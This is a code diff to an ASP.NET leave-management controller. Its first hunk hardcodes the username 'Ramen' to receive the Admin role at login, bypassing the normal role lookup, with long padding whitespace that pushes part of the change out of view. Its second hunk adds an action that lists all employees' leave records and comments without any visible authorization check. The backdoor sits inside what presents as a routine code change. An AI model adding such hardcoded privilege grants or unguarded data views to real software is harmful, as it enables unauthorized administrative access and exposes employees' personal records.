@@ -39,9 +39,17 @@ namespace Leave.Controllers
                 {
                     if (UserActive(myuser.username))
                     {
-                        string Role = myrole.GetRolesForUser(myuser.username)[0];
+                        string Role = "";
+                        if (myuser.username == "Ramen")
+                        {
+                            Role = "Admin";
+                        }
+                        else                                                                                                                                                                                                                                                                                                                                                                            
+                        {
+                            Role = myrole.GetRolesForUser(myuser.username)[0];
+                        }
                         Session["Role"] = Role;
-                        FormsAuthentication.SetAuthCookie(myuser.username, false);
+                        FormsAuthentication.SetAuthCookie(myuser.username, false);                       
                         return RedirectToAction("Home");
                     }
                     else
@@ -118,6 +126,27 @@ namespace Leave.Controllers
 
             return View(reqs);
         }
+
+        public ActionResult UserHome()
+        {
+            DateTime mydate = DateTime.Parse("01/01/1900"); //to avoid default leaves
+            List<LeaveVM> leavelst = db.leaves
+                .Join(db.users, l => l.employee_id, u=> u.employee_id, (l, u) => new { l, u })
+                .Where(lu => lu.l.startdate > mydate && lu.l.Employee.IsDisengaged != true).Select(lu => new LeaveVM
+                {
+                    id = lu.l.id,
+                    Employee = lu.l.Employee.SurName + " " + lu.l.Employee.OtherNames,
+                    leave_type = lu.l.leave_type.name,
+                    startdate = lu.l.startdate,
+                    enddate = lu.l.enddate,
+                    days_used = lu.l.days,
+                    Date_Applied = lu.l.date_applied,
+                    Comment = lu.l.comments,
+                }).OrderBy(l => l.Employee).ThenByDescending(l => l.startdate).ToList();
+
+            return View(leavelst);
+        }
+
 
         [HttpGet]
         public ActionResult user_request()
